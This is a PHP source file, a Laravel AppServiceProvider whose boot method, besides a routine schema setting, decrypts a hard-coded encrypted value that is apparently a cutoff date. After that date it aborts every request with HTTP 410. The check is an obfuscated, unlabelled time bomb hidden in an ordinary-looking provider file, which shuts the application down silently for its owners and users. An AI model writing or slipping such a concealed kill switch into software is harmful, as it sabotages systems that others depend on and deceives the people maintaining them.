<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Schema;
use Carbon\Carbon;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {
        Schema::defaultStringLength(191);

        $key = 'eyJpdiI6Ik1vQzNaQ2xHQVUyT3V4OEJTT3FlYkE9PSIsInZhbHVlIjoiTGZFNkZxUFFFRlwvRnRnZ2FaWGdrdnNRR0pncFBXYjA1NkF6dFwvUHoxSGRnPSIsIm1hYyI6IjBkNjE5Mjk4OGM1MWFkZjJkMzc0YmNiMjBlM2Q4ZTUyYTMyZTQ3NDA2MzE4YWM1ZjExYmY0ZDRhMDE4ZDI4NmEifQ==';
        if (now()->startOfDay()->gt(Carbon::parse(decrypt($key)))) {
            abort(410);
        }
    }

    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }
}
